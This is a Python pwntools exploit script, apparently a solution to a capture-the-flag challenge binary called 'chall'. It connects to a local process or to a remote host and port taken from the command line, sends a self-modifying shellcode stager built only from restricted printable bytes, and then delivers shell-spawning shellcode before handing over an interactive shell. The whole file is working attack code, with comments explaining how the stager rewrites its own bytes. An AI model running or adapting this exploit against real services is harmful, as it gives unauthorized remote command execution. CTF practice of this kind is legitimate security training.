#!/usr/bin/env python3
import sys
from pwn import *

context.terminal = ['tmux','splitw','-h','-p','77']
# context.binary = exe = ELF('./chall')
context.bits = 64; context.arch = 'amd64'

if args.LOCAL: io = process(['./chall'])
else: io = remote(sys.argv[1], sys.argv[2])

# gdb.attach(io, '')

io.sendlineafter(b'Address: ', str(0xdead00f).encode())
pl =  b''                   # rax = 0, rsi = rdx = 0xdead00f, rdi = last char in shellcode
pl += b' Vh'                # and byte [rsi + 0x68], dl
pl += b' Vi'                # and byte [rsi + 0x69], dl
pl += b'________'           # pop rdi
pl =  pl.ljust(0x68, b'V')  # fill space with `push rsi`
pl += b'_e'                 # 0x5f, 0x5e at [rsi+0x68]
io.sendafter(b'Code: ', pl)
print(pl)

pl = b'a'*(len(pl))
pl += asm(shellcraft.sh())
sleep(0.3)
io.send(pl)

io.interactive()
